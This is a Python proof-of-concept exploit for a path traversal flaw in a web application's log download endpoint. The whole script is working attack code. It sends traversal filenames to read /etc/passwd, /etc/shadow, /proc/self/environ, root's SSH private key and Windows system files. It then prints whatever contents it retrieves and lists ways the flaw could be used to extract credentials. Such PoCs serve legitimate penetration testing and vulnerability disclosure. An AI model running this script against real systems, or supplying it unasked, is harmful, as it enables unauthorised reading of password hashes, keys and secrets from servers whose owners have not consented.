#!/usr/bin/env python3

import requests
import sys
import re

def path_traversal_poc(base_url):
    print("\n[*] Path Traversal Proof of Concept")
    print("[*] This PoC demonstrates path traversal via the log download function")
    
    # The vulnerable endpoint
    download_url = f"{base_url}/download_log"
    
    # First, try normal access to confirm the functionality works
    print("\n[+] Attempting to access the normal log file...")
    normal_params = {"filename": "app.log"}
    
    response = requests.get(download_url, params=normal_params)
    if response.status_code == 200 and len(response.text) > 0:
        print("[+] Successfully accessed the normal log file")
        print(f"[+] Log file size: {len(response.text)} bytes")
        print(f"[+] First few lines of log file:")
        lines = response.text.split('\n')[:3]
        for line in lines:
            print(f"    {line}")
    else:
        print("[-] Failed to access the normal log file")
        print(f"[-] Status code: {response.status_code}")
        print(f"[-] Response: {response.text[:100]}")
    
    # Now try path traversal to access sensitive files
    print("\n[+] Attempting path traversal...")
    
    # List of sensitive files to try accessing
    sensitive_files = [
        "../../../etc/passwd",       # Unix user information
        "../../../etc/shadow",       # Unix password hashes
        "../../../etc/hosts",        # Host file
        "../../../proc/self/environ", # Process environment variables
        "../../../var/log/auth.log", # Authentication logs
        "../../../root/.ssh/id_rsa", # SSH private key
        "../../../var/www/html/index.html", # Web root
        "..\\..\\..\\Windows\\win.ini", # Windows specific
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts" # Windows hosts file
    ]
    
    for filepath in sensitive_files:
        print(f"\n[+] Trying to access: {filepath}")
        traversal_params = {"filename": filepath}
        
        response = requests.get(download_url, params=traversal_params)
        
        # Check for signs of successful path traversal
        if response.status_code == 200 and len(response.text) > 0:
            # Look for specific patterns in the files
            if "root:" in response.text or "localhost" in response.text or "[boot loader]" in response.text:
                print("[!] PATH TRAVERSAL SUCCESSFUL!")
                print(f"[+] Successfully accessed: {filepath}")
                print(f"[+] File size: {len(response.text)} bytes")
                print(f"[+] File content (first few lines):")
                lines = response.text.split('\n')[:5]
                for line in lines:
                    print(f"    {line}")
                    
                print("\n[+] This vulnerability could be used to:")
                print("    1. Access sensitive configuration files")
                print("    2. Read application source code")
                print("    3. Access database files")
                print("    4. Extract credentials and secrets")
                
                # Break after finding a successful path traversal
                break
            else:
                print("[-] File accessed but doesn't contain expected content")
                print(f"[-] Response preview: {response.text[:50]}...")
        else:
            print("[-] Failed to access this file")
            if response.status_code != 200:
                print(f"[-] Status code: {response.status_code}")
            if len(response.text) > 0 and len(response.text) < 100:
                print(f"[-] Response: {response.text}")
    else:
        print("\n[-] Path traversal attempts failed - target might be patched")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
        
    base_url = sys.argv[1].rstrip('/')
    path_traversal_poc(base_url)